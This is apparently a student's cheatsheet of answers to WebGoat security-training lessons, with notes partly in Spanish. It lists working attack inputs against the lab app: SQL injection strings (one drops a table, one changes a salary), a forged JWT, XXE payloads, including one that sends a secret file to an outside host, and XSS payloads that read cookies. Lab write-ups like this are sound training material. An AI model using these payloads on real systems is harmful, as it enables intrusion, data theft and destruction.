# Cheatsheet

https://github.com/WebGoat/WebGoat/wiki/Main-Exploits

## CIA TRIAD
[Descripción de CIAD](https://www.forcepoint.com/es/cyber-edu/cia-triad)

1- Solution 3: By stealing a database where names and emails are stored and uploading it to a website.
2- Solution 1: By changing the names and emails of one or more users stored in a database.
3- Solution 4: By launching a denial of service attack on the servers.
4- Solution 2: The systems security is compromised even if only one goal is harmed.

## Crypto basics

### 2

[Encoding](https://www.w3.org/International/questions/qa-what-is-encoding)
[Encode64](https://www.base64decode.org/)

### 3

[XOR IBM](https://strelitzia.net/wasXORdecoder/wasXORdecoder.html)

`databasepassword`

### 4

[MD5](https://www.md5online.org/md5-decrypt.html)
[SHA256](https://hashes.com/es/decrypt/hash)

### 5
Symmetric - Misma llave
-  Is an older method of encryption, it is faster and more efficient than asymmetric encryption, which takes a toll on networks due to performance issues with data size and heavy CPU use.
-  Is typically used for bulk encryption / encrypting large amounts of data, e.g. for database encryption. In the case of a database, the secret key might only be available to the database itself to encrypt or decrypt.


 Asymmetric - llave publica llave privada
 
# A1 Injection

## Intro

### 2

```SQL
select employees.department from employees where first_name = 'Bob' and last_name = 'Franco';
```
### 3

```SQL
UPDATE employees SET department = 'Sales' WHERE first_name = 'Tobi' and last_name = 'Barnett';
```
### 4

```SQL
ALTER TABLE employees ADD phone varchar(20);
```
### 5

```SQL
GRANT ALTER TABLE to 'UnauthorizedUser';
```
### 9

```
Smith'
or 
'1' = '1 
```

### 10

```
1
'1' or true = true
```

### 11

```
'" or true = true or '1' = '"
3SL99A
```


### 12

```
Smith
3SL99A'; update employees SET salary = 90000 where first_name = 'John' and last_name = 'Smith 
```

### 13

```sql
%'; DROP TABLE access_log;--
```
# A2

## Authentication Bypasses

### 2

```
secQuestion00=asd&secQuestion01=asd
```

## JWT

### 4

```
victory
eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1OTgxMzA5MjIsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.WOETTS9Ed14B7_O2_TCBmGDHHfUH0fNnQKMGCXm3BqU-Tz0dJ-DX2IAqQjOqKchNOLVLFLJ8j2MkjgzwoYEVkQ
```

### 5

```
business
username: Webgoat
adelantar el tiempo de expiracion
```

# A4
## XXE
### 3
```xml
<?xml version="1.0" encoding='UTF-8'?>
<!DOCTYPE comment [
  <!ELEMENT comment (Activity)>
  <!ELEMENT Activity (#PCDATA)>
  <!ENTITY xxe SYSTEM "file:///">
]><comment>  <text>&xxe;</text></comment>
```
### 7 

```
Content-Type: application/xml;
```
```xml
<?xml version="1.0" encoding='UTF-8'?>
<!DOCTYPE comment [
  <!ELEMENT comment (Activity)>
  <!ELEMENT Activity (#PCDATA)>
  <!ENTITY xxe SYSTEM "file:///">
]><comment>  <text>&xxe;</text></comment>
```

### 11

Peticion 

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
	<!ENTITY % xxe SYSTEM "http://10.0.2.15:9090/files/adrianeguez/attack3.dtd">
	%xxe;
]>
<comment>  <text>no need to inject here</text></comment>
```
attack.dtd
```xml
<!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-8.1.0/XXE/secret.txt">
<!ENTITY % bar "<!ENTITY &#x25; out SYSTEM 'http://10.0.2.15:9090/landing/xxe?content=%file;'>">
%bar;
%out;
```

# A5

## Missing Function Level Access Control

### 3
```
GET http://10.0.2.15:8080/WebGoat/users HTTP/1.1
Content-Type: application/json;
```


## Access control flaws -  Guessing & Predicting Patterns

```
WebGoat/IDOR/profile/2342384
```

## XXE - Let's try

```xml
<?xml version="1.0" encoding='UTF-8'?>
<!DOCTYPE comment [
  <!ELEMENT comment (Activity)>
  <!ELEMENT Activity (#PCDATA)>
  <!ENTITY xxe SYSTEM "..">
]>
```
## Modern REST framework

```xml
<?xml version="1.0" encoding='UTF-8'?>
<!DOCTYPE comment [
  <!ELEMENT comment (Activity)>
  <!ELEMENT Activity (#PCDATA)>
  <!ENTITY xxe SYSTEM "..">
]>
<comment><text>&xxe;</text></comment>
```

## Try It! String SQL Injection

```
Smith' and '1'='1
```

## Try It! Numeric SQL Injection

```
101 OR TRUE
```

## SQL Injection (mitigation) - ZAP

```
192.168.6.4
```

## Authentication Bypasses - ZAP

```
secQuestion00=asd&secQuestion01=asd
```

## What is XSS

```
yes / no 
```

```
javascript:alert(document.cookie);
```

## Try It! Reflected XSS

Enter your credit card number:
```
<script>alert('my javascript here')</script>
```
## Identify Potential for DOM-Based XSS

```
start.mvc#test/
```

## Try It! DOM-Based XSS

Consola:
```
webgoat.customjs.phoneHome()
```
